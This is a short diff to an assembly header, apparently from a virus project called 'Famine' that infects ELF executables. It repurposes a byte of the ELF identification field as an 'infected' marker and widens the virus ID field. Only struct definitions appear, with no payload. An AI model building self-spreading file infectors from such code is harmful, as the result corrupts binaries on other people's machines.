@@ -56,7 +56,8 @@
 %define SYS_GETRANDOM   318
 
 struc   Elf64_Ehdr
-    e_ident:     resb 16   ;       /* Magic number and other info */
+    e_ident:     resb 15   ;       /* Magic number and other info */
+    e_infected:  resb 1
     e_type:      resw 1    ;		/* Object file type */
     e_machine:   resw 1    ;		/* Architecture */
     e_version:   resd 1    ;		/* Object file version */
@@ -115,7 +116,7 @@ struc famine
     entry:      resq 1
     oldEntry:   resq 1
     programStart: resq 1
-    virusId:    resq 1
+    virusId:    resq 2
 
     fileName: resb PATH_BUFF_SIZE
 endstruc
